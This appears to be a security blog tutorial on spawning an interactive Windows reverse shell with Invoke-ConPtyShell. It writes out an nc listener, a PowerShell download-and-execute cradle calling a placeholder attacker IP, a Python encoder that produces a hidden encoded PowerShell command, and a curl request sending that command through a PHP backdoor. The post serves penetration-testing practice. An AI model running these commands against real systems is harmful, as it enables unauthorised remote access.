<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <link rel="shortcut icon" href="/images/favicon.png " type="image/png">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Grant Trowbridge's Blog - When Shells Stabilize: Spawning Fully Interactive Windows Shells with Invoke-ConPtyShell</title>
  <meta name="description" content="Picture this. You&#39;re in a good workflow on a Windows target, you even added line editing and command history with rlwrap. Then it happens, you accidental...">
  <link rel="stylesheet" href="/css/main.css ">
  <link rel="alternate" type="application/rss+xml" title="Grant Trowbridge's Blog" href="http://localhost:4000/feed.xml
    " />
</head>

<body>
  <div id="header">
  <div id="header__content">
    <div id="header__info">
      <h1><a href="/">Grant Trowbridge's Blog</a></h1>
      <p>A Cyber Security blog covering security-related topics, CTFs, and signals
</p>
      <img src="/images/avatar.png" alt="avatar">
    </div>
    <ul id="header__nav">
      <li><a href="/" class="">Main</a>
      </li>
      <li><a href="/about" class="">whoami</a></li>
      <li><a href="/archive" class="">Archive</a></li>
    </ul>
  </div>
</div>
  <div id="content">
    <div id="content__column">
      <div id="single">
  <h2 class="single__title">When Shells Stabilize: Spawning Fully Interactive Windows Shells with Invoke-ConPtyShell</h2>
  <span class="single__date">Sep 9, 2025</span> 
  <article class="single__article">
  <p>Picture this. You&#39;re in a good workflow on a Windows target, you even added line editing and command history with <code>rlwrap</code>. Then it happens, you accidentally start a program in the foreground... Instinctively, you press <code>Ctrl + C</code> in your <code>nc</code> Windows shell, killing your shell access along with the program. Not ideal, and very frustrating.</p>

<p>Enter <a href="https://github.com/antonioCoco/ConPtyShell">Invoke-ConPtyShell.ps1</a>, a fully interactive reverse shell for Windows. Gone are the days of accidental shell deaths. All you&#39;ll need is an HTTP server, <code>nc</code> listener, and a good attitude :)</p>

<p><strong>Disclaimer:</strong> <code>Invoke-ConPtyShell.ps1</code> utilizes the <a href="https://learn.microsoft.com/en-us/windows/console/createpseudoconsole">CreatePseudoConsole</a> function, which is only available since Windows 10 / Windows Server 2019 version 1809 (build 10.0.17763). If this function is <em>not</em> available on the target, you will receive a normal <code>nc</code> shell.</p>

<h1>Staging the Script &amp; Listener</h1>

<p>Navigate to the above linked GitHub repository and download the <code>Invoke-ConPtyShell.ps1</code> PowerShell script onto your attack machine.</p>

<p>Host the file on your attack machine with <code>python3 -m http.server 80</code>.</p>
<div class="highlight"><pre><code class="language-" data-lang="">┌──(kali㉿kali)-[~/Documents/MyTools/ConPtyShell]
└─$ ls   
Invoke-ConPtyShell.ps1

┌──(kali㉿kali)-[~/Documents/MyTools/ConPtyShell]
└─$ python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
</code></pre></div>
<p>Setup your reverse shell listener on your attack machine with <code>stty raw -echo; (stty size; cat) | nc -lvnp &lt;ATTACK-PORT&gt;</code>, where <code>&lt;ATTACK-PORT&gt;</code> is your listener port of choice.</p>
<div class="highlight"><pre><code class="language-" data-lang="">┌──(kali㉿kali)-[~/Documents/MyTools/ConPtyShell]
└─$ stty raw -echo; (stty size; cat) | nc -lvnp 443
listening on [any] 443 ...
</code></pre></div>
<h1>Breaking Down the Command</h1>

<p>You may have noticed that my PowerShell download command is slightly different from the <code>README.md</code> example, but both achieve the same end goal of downloading and executing the PowerShell script <em>without</em> saving it to disk.</p>
<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="n">IEX</span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="s2">"http://&lt;ATTACK-IP&gt;/Invoke-ConPtyShell.ps1"</span><span class="p">);</span><span class="n">Invoke-ConPtyShell</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">ATTACK-IP</span><span class="err">&gt;</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">ATTACK-PORT</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-Rows</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">ROWS</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-Cols</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">COLS</span><span class="err">&gt;</span><span class="w">
</span></code></pre></div>
<ul>
<li><code>Invoke-Expression (IEX)</code>: Evaluate/run a specified string as a command and returns the results of the expression/command. This allows you to save the script directly in memory.</li>
<li><code>New-Object</code>: Create an instance of a Microsoft .NET Framework or COM object (System.Net.WebClient in this case).</li>
<li><code>.DownloadString()</code>: Downloads the requested resource (Invoke-ConPtyShell.ps1) as a string.</li>
<li><code>Invoke-ConPtyShell</code>: Executing the ConPtyShell script now in memory.</li>
</ul>

<h1>Encoding the Command</h1>

<p>Before preceding any further, take note of your attack machine&#39;s terminal size with <code>stty size</code>. This will output the number of rows and columns, respectively. It is important to configure the terminal size correctly or you may inadvertently cut off valuable output in your shell.</p>
<div class="highlight"><pre><code class="language-" data-lang="">┌──(kali㉿kali)-[~/Documents/MyTools/ConPtyShell]
└─$ stty size                                      
52 236
</code></pre></div>
<p>Attempting to use <code>echo</code> and piping the output to <code>base64</code> on Linux does not result in a properly encoded command. <code>echo</code> outputs text in <code>UTF-8</code> encoding by default, whereas PowerShell is expecting <code>UTF-16LE</code> (little endian). This is where the following Python script comes into play.</p>
<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/python3
</span><span class="kn">import</span> <span class="nn">base64</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s">'IEX(New-Object System.Net.WebClient).DownloadString("http://&lt;ATTACK-IP&gt;/Invoke-ConPtyShell.ps1");Invoke-ConPtyShell &lt;ATTACK-IP&gt; &lt;ATTACK-PORT&gt; -Rows &lt;ROWS&gt; -Cols &lt;COLS&gt;'</span>
<span class="n">cmd</span> <span class="o">=</span> <span class="s">"powershell -nop -w hidden -e "</span> <span class="o">+</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">payload</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf16'</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]).</span><span class="n">decode</span><span class="p">()</span>
<span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\033</span><span class="s">[1;37m[*] Encoded command: </span><span class="se">\033</span><span class="s">[1;00m</span><span class="se">\033</span><span class="s">[1;33m"</span> <span class="o">+</span> <span class="n">cmd</span> <span class="o">+</span> <span class="s">"</span><span class="se">\033</span><span class="s">[00m"</span><span class="p">)</span>
</code></pre></div>
<ul>
<li><code>&lt;ATTACK-IP&gt;</code>: Attack machine&#39;s IP address.</li>
<li><code>&lt;ATTACK-PORT&gt;</code>: Attack machine&#39;s <code>nc</code> reverse shell listener port.</li>
<li><code>&lt;ROWS&gt;</code>: Number of terminal rows.</li>
<li><code>&lt;COLS&gt;</code>: Number of terminal columns.</li>
</ul>

<p>Once you&#39;ve entered all IP, port, and terminal information, execute the Python script using <code>python3 conpty.py</code> to output the encoded PowerShell command.</p>
<div class="highlight"><pre><code class="language-" data-lang="">┌──(kali㉿kali)-[~/Documents/MyTools/ConPtyShell]
└─$ python3 conpty.py          
[*] Encoded command: powershell -nop -w hidden -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0A...
</code></pre></div>
<h1>Execution</h1>

<p>All that is left to do is copy the command and execute it via your target&#39;s RCE vulnerability. This example uses a PHP backdoor.</p>
<div class="highlight"><pre><code class="language-" data-lang="">┌──(kali㉿kali)-[~/Documents/MyTools/ConPtyShell]
└─$ curl -b "wordpress_d407..." "http://192.168.X.X/foo/bar-content/plugins/askimet/?cmd=powershell%20-nop%20-w%20hidden%20-e%20SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0A..."
</code></pre></div>
<p>If you navigate back to the Python HTTP server terminal, you&#39;ll notice the target has downloaded the PowerShell script.</p>
<div class="highlight"><pre><code class="language-" data-lang="">┌──(kali㉿kali)-[~/Documents/MyTools/ConPtyShell]
└─$ python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.X.X - - [08/Sep/2025 21:49:58] "GET /Invoke-ConPtyShell.ps1 HTTP/1.1" 200 -
</code></pre></div>
<p>Navigate to the reverse shell listener terminal and enjoy your fully interactive Windows reverse shell, <code>Ctrl + C</code> and all!</p>
<div class="highlight"><pre><code class="language-" data-lang="">Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\foo\htdocs\bar&gt; whoami
bar\corpuser
PS C:\foo\htdocs\bar&gt; ^C
PS C:\foo\htdocs\bar&gt; ^C
PS C:\foo\htdocs\bar&gt;
</code></pre></div>
  </article>
</div>
    </div>
  </div>
    <div id="footer">
  Powered by <a href="http://jekyllrb.com" target="_blank">Jekyll</a> · <a href="https://github.com/ifedyukin/Mekyll">Mekyll</a> theme <br>
</div>

</body>
</html>